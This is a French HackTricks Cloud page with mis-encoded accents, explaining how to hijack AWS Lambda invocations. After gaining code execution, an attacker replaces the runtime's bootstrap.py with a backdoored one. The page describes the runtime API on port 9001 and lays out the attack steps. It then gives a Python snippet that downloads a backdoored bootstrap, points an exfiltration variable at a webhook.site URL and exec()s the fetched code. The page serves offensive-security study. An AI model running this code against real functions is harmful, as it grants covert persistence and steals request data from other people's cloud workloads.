# AWS - Voler des requ√™tes Lambda

{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Formation AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Formation GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}

## Flux Lambda

<figure><img src="../../../../.gitbook/assets/image (341).png" alt=""><figcaption><p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/10/lambda_poc_2_arch.png">https://unit42.paloaltonetworks.com/wp-content/uploads/2019/10/lambda_poc_2_arch.png</a></p></figcaption></figure>

1. **Slicer** est un processus en dehors du conteneur qui **envoie** des **invocations** au processus **init**.
2. Le processus init √©coute sur le port **9001** exposant quelques points de terminaison int√©ressants :
* **`/2018-06-01/runtime/invocation/next`** ‚Äì obtenir le prochain √©v√©nement d'invocation
* **`/2018-06-01/runtime/invocation/{invoke-id}/response`** ‚Äì retourner la r√©ponse du gestionnaire pour l'invocation
* **`/2018-06-01/runtime/invocation/{invoke-id}/error`** ‚Äì retourner une erreur d'ex√©cution
3. **bootstrap.py** a une boucle r√©cup√©rant les invocations du processus init et appelle le code de l'utilisateur pour les g√©rer (**`/next`**).
4. Enfin, **bootstrap.py** envoie au processus init la **r√©ponse**

Notez que bootstrap charge le code de l'utilisateur en tant que module, donc toute ex√©cution de code effectu√©e par le code de l'utilisateur se produit en r√©alit√© dans ce processus.

## Voler des requ√™tes Lambda

L'objectif de cette attaque est de faire ex√©cuter au code de l'utilisateur un processus **`bootstrap.py`** malveillant √† l'int√©rieur du processus **`bootstrap.py`** qui g√®re la requ√™te vuln√©rable. De cette mani√®re, le processus **bootstrap malveillant** commencera √† **communiquer avec le processus init** pour g√©rer les requ√™tes pendant que le bootstrap **l√©gitime** est **pi√©g√©** en ex√©cutant le malveillant, donc il ne demandera pas de requ√™tes au processus init.

C'est une t√¢che simple √† r√©aliser car le code de l'utilisateur est ex√©cut√© par le processus **`bootstrap.py`** l√©gitime. Ainsi, l'attaquant pourrait :

* **Envoyer un faux r√©sultat de l'invocation actuelle au processus init**, de sorte que init pense que le processus bootstrap attend plus d'invocations.
* Une requ√™te doit √™tre envoy√©e √† **`/${invoke-id}/response`**
* L'invoke-id peut √™tre obtenu √† partir de la pile du processus **`bootstrap.py`** l√©gitime en utilisant le module python [**inspect**](https://docs.python.org/3/library/inspect.html) (comme [propos√© ici](https://github.com/twistlock/lambda-persistency-poc/blob/master/poc/switch\_runtime.py)) ou simplement en le demandant √† nouveau √† **`/2018-06-01/runtime/invocation/next`** (comme [propos√© ici](https://github.com/Djkusik/serverless\_persistency\_poc/blob/master/gcp/exploit\_files/switcher.py)).
* Ex√©cuter un **`bootstrap.py`** malveillant qui g√©rera les prochaines invocations
* Pour des raisons de discr√©tion, il est possible d'envoyer les param√®tres d'invocation lambda √† un C2 contr√¥l√© par l'attaquant et ensuite de g√©rer les requ√™tes comme d'habitude.
* Pour cette attaque, il suffit d'obtenir le code original de **`bootstrap.py`** du syst√®me ou de [**github**](https://github.com/aws/aws-lambda-python-runtime-interface-client/blob/main/awslambdaric/bootstrap.py), d'ajouter le code malveillant et de l'ex√©cuter √† partir de l'invocation lambda actuelle.

### √âtapes de l'attaque

1. Trouver une vuln√©rabilit√© **RCE**.
2. G√©n√©rer un **bootstrap** **malveillant** (par exemple [https://raw.githubusercontent.com/carlospolop/lambda\_bootstrap\_switcher/main/backdoored\_bootstrap.py](https://raw.githubusercontent.com/carlospolop/lambda\_bootstrap\_switcher/main/backdoored\_bootstrap.py))
3. **Ex√©cuter** le bootstrap malveillant.

Vous pouvez facilement effectuer ces actions en ex√©cutant :
```bash
python3 <<EOF
import os
import urllib3

# Download backdoored bootstrap
http = urllib3.PoolManager()
backdoored_bootstrap_url = "https://raw.githubusercontent.com/carlospolop/lambda_bootstrap_switcher/main/backdoored_bootstrap.py"
new_runtime = http.request('GET', backdoored_bootstrap_url).data

# Load new bootstrap
os.environ['URL_EXFIL'] = "https://webhook.site/c7036f43-ce42-442f-99a6-8ab21402a7c0"

exec(new_runtime)
EOF
```
Pour plus d'informations, consultez [https://github.com/carlospolop/lambda\_bootstrap\_switcher](https://github.com/carlospolop/lambda\_bootstrap\_switcher)

## R√©f√©rences

* [https://unit42.paloaltonetworks.com/gaining-persistency-vulnerable-lambdas/](https://unit42.paloaltonetworks.com/gaining-persistency-vulnerable-lambdas/)

{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}
